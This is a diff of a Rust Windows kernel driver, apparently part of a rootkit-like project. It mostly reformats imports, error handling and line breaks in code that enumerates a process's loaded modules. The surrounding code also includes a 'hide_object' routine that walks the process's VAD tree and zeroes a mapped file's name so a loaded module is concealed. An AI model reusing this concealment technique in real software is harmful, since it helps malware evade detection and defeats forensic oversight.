@@ -5,16 +5,16 @@ use wdk_sys::{
 };
 
 use crate::data::{
-    PsGetProcessPeb, MMVAD, 
-    MMVAD_SHORT, LDR_DATA_TABLE_ENTRY, 
-    PEB
+    LDR_DATA_TABLE_ENTRY,
+    MMVAD, MMVAD_SHORT,
+    PEB, PsGetProcessPeb
 };
 use crate::{
-    error::ShadowError,
-    offsets::get_vad_root,
+    Result, 
+    error::ShadowError, 
+    offsets::get_vad_root, 
     process::Process,
     utils::attach::ProcessAttach,
-    Result,
 };
 
 /// Represents a module in the operating system.
@@ -44,7 +44,7 @@ impl Module {
         // Gets the PEB (Process Environment Block) of the target process
         let peb = PsGetProcessPeb(target.e_process) as *mut PEB;
         if peb.is_null() || (*peb).Ldr.is_null() {
-            return Err(ShadowError::FunctionExecutionFailed("PsGetProcessPeb", line!()));
+            return Err(ShadowError::ApiCallFailed("PsGetProcessPeb", -1));
         }
 
         // Enumerates the loaded modules from the InLoadOrderModuleList
@@ -67,7 +67,7 @@ impl Module {
                 (*list_entry).FullDllName.Buffer,
                 ((*list_entry).FullDllName.Length / 2) as usize,
             );
-            
+
             if buffer.is_empty() {
                 return Err(ShadowError::StringConversionFailed((*list_entry).FullDllName.Buffer as usize));
             }
@@ -132,9 +132,11 @@ impl Module {
                 (*list_entry).FullDllName.Buffer,
                 ((*list_entry).FullDllName.Length / 2) as usize,
             );
-            
+
             if buffer.is_empty() {
-                return Err(ShadowError::StringConversionFailed((*list_entry).FullDllName.Buffer as usize));
+                return Err(ShadowError::StringConversionFailed(
+                    (*list_entry).FullDllName.Buffer as usize,
+                ));
             }
 
             // Check if the module name matches
@@ -175,7 +177,8 @@ impl Module {
     /// * `Err(ShadowError)` - If an error occurs while attempting to hide the module.
     pub unsafe fn hide_object(target_address: u64, process: Process) -> Result<()> {
         let vad_root = get_vad_root();
-        let vad_table = process.e_process.cast::<u8>().offset(vad_root as isize) as *mut RTL_BALANCED_NODE;
+        let vad_table = process.e_process.cast::<u8>()
+            .offset(vad_root as isize) as *mut RTL_BALANCED_NODE;
         let current_node = vad_table;
 
         // Uses a stack to iteratively traverse the tree
@@ -218,7 +221,12 @@ impl Module {
                 }
 
                 let file_object = ((*(*subsection).ControlArea).FilePointer.Inner.Value & !0xF) as *mut FILE_OBJECT;
-                core::ptr::write_bytes((*file_object).FileName.Buffer, 0, (*file_object).FileName.Length as usize);
+                core::ptr::write_bytes(
+                    (*file_object).FileName.Buffer,
+                    0,
+                    (*file_object).FileName.Length as usize,
+                );
+                
                 break;
             }
 
